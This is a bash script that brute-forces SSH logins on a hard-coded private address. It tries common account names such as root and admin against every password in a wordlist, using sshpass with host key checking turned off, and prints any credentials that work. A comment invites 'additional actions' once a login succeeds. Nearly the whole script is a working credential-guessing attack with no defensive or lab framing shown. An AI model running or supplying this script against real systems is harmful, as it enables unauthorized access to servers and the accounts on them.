#!/bin/bash

# Define the target SSH server and port
TARGET="172.16.10.13"
PORT=22

# Define the username and password lists
usernames=("root" "admin" "guest" "backup" "ubuntu" "centos")
password_file="passwords.txt"

echo "Starting SSH credential testing..."

# Loop through each combination of usernames and passwords
for username in "${usernames[@]}"; do
    while IFS= read -r password; do
        echo "Testing credentials: $username / $password"

        # Check the exit code to determine if the login was successful
        if sshpass -p "$password" ssh -o "StrictHostKeyChecking=no" -p "$PORT" "$username@$TARGET" exit >/dev/null 2>&1; then
            echo "Successful login with credentials:"
            echo "Host: $TARGET"
            echo "Username: $username"
            echo "Password: $password"

            # You can perform additional actions here using the successful credentials

            exit 0
        fi
    done < "$password_file"
done

echo "No valid credentials found."
